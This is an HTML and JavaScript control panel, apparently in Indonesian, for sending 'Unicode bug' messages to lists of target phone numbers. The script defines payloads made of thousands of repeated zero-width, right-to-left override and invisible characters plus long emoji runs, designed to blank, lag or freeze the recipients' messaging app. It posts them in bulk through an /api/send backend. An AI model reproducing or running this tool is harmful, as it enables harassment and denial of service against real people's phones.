<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<title>Zionixszy Bug Panel</title>
<style>
  body{font-family:'Segoe UI',sans-serif;background:#0d0d0d;color:#eee;max-width:500px;margin:40px auto;padding:20px}
  h2{text-align:center;font-size:28px;color:#00ffe1;text-shadow:0 0 6px #00ffe1,0 0 16px #00ffe1}

  input,select{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;background:#1a1a1a;color:#fff;font-size:16px;box-shadow:inset 0 0 5px #222}
  label{display:block;margin-top:16px;font-weight:600;color:#ccc}

  .btn{padding:14px;font-size:15px;font-weight:bold;border:none;border-radius:12px;cursor:pointer;background-size:300% 300%;animation:glow 3s ease infinite;color:white;transition:.3s;text-transform:uppercase;letter-spacing:1px}
  .btn:hover{transform:scale(1.05);opacity:.95}
  .btn-add {background-image:linear-gradient(45deg,#ff00cc,#3333ff,#ff00cc)}
  .btn-check{background-image:linear-gradient(45deg,#ffaa00,#ff5500,#ffaa00)}
  .btn-send {background-image:linear-gradient(45deg,#00ffcc,#0099ff,#00ffcc);color:#000;text-shadow:0 0 2px #00f5ff}
  @keyframes glow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}

  .group{margin-top:22px}
  .status{margin-top:6px;font-size:14px;text-align:center;font-weight:bold}
  .ok   {color:#00ff85}
  .err  {color:#ff6565}
</style>
</head>
<body>
  <h2>Zionixszy Bug Panel</h2>

  <label for="number">Nomor Target</label>
  <input id="number" placeholder="6281234567890" />

  <label for="bugType">Jenis Bug Unicode</label>
  <select id="bugType">
    <option value="blank">üí® UI Delay / Blank</option>
    <option value="freeze">‚ùÑÔ∏è Freeze Emoji + RTL</option>
    <option value="lite">ü´ß Kosong Ringan</option>
  </select>

  <!-- ADD NUMBER -->
  <div class="group">
    <button class="btn btn-add" onclick="addNumber()">‚ûï Tambah Nomor</button>
    <div id="statusAdd" class="status"></div>
  </div>

  <!-- CHECK TARGET -->
  <div class="group">
    <button class="btn btn-check" onclick="cekJumlah()">üîç Cek Jumlah Target</button>
    <div id="statusCheck" class="status"></div>
  </div>

  <!-- SEND BUG -->
  <div class="group">
    <button class="btn btn-send" onclick="sendBug()">üöÄ Kirim Unicode Bug</button>
    <div id="statusSend" class="status"></div>
  </div>

<script>
  /* helpers */
  const bugMap = {
    blank : '\u2063\u200F\u202E\u200B\u2060'.repeat(3000),
    freeze: 'ü§£'.repeat(1500)+'\u202E'.repeat(1500)+'‚Äè'.repeat(1000),
    lite  : '\u200B\u2060'.repeat(500)
  };

  function setStatus(id,msg,ok=true){
    const el=document.getElementById(id);
    el.textContent=msg;
    el.className='status '+(ok?'ok':'err');
  }

  /* ADD NUMBER */
  async function addNumber(){
    setStatus('statusAdd','‚è≥ Memproses‚Ä¶');
    const number=document.getElementById('number').value.trim();
    if(!number.startsWith('62')) return setStatus('statusAdd','Nomor harus diawali 62',false);

    try{
      const r=await fetch('/api/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number})});
      const j=await r.json();
      if(j.ok) setStatus('statusAdd',`‚úÖ Ditambah! Total ${j.total}`);
      else     setStatus('statusAdd',`‚ùå ${j.error}`,false);
    }catch(e){ setStatus('statusAdd','‚ùå '+e.message,false); }
  }

  /* CHECK TARGET */
  async function cekJumlah(){
    setStatus('statusCheck','‚è≥ Mengambil‚Ä¶');
    try{
      const r=await fetch('/api/send',{method:'OPTIONS'});
      const j=await r.json();
      setStatus('statusCheck',`üìä Total target: ${j.total||0}`);
    }catch(e){ setStatus('statusCheck','‚ùå '+e.message,false); }
  }

  /* SEND BUG */
  async function sendBug(){
    setStatus('statusSend','‚è≥ Mengirim‚Ä¶');
    const type=document.getElementById('bugType').value;
    const message=bugMap[type]||bugMap.blank;

    try{
      const r=await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
      const j=await r.json();
      if(j.ok) setStatus('statusSend',`‚úÖ Terkirim ke ${j.sent} nomor`);
      else     setStatus('statusSend',`‚ùå ${j.error}`,false);
    }catch(e){ setStatus('statusSend','‚ùå '+e.message,false); }
  }
</script>
</body>
</html>
